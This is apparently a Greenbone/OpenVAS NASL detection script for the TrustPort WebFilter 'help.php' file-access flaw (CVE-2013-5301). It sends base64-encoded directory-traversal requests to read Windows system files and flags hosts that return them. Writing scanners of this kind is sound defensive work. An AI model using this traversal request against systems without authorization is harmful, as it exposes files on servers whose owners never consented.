if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103751" );
	script_cve_id( "CVE-2013-5301" );
	script_bugtraq_id( 61662 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-08-08 10:35:29 +0200 (Thu, 08 Aug 2013)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_name( "TrustPort WebFilter 'help.php' Arbitrary File Access Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 4849 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/61662" );
	script_tag( name: "impact", value: "An attacker can exploit this issue to read arbitrary files in the
  context of the web server process, which may aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a special GET request, with a base64 encoded
  directory traversal string and file name" );
	script_tag( name: "insight", value: "A vulnerability exists within the help.php script, allowing a remote attacker to
  access files outside of the webroot with SYSTEM privileges, without authentication." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "TrustPort WebFilter is prone to an arbitrary file-access
  vulnerability." );
	script_tag( name: "affected", value: "TrustPort WebFilter 5.5.0.2232 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 4849 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: "GET /index1.php HTTP/1.0\r\n\r\n" );
for(;r = recv( socket: soc, length: 1024 );){
	resp += r;
}
close( soc );
if(!ContainsString( resp, "<title>TrustPort WebFilter" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	traversal = "../../../../../../../../../../../../../../../" + files[file];
	traversal = base64( str: traversal );
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	url = "/help.php?hf=" + traversal;
	req = "GET " + url + " HTTP/1.0\n\n\n\n";
	send( socket: soc, data: req );
	for(;r = recv( socket: soc, length: 1024 );){
		ret += r;
	}
	close( soc );
	if(eregmatch( pattern: file, string: ret )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

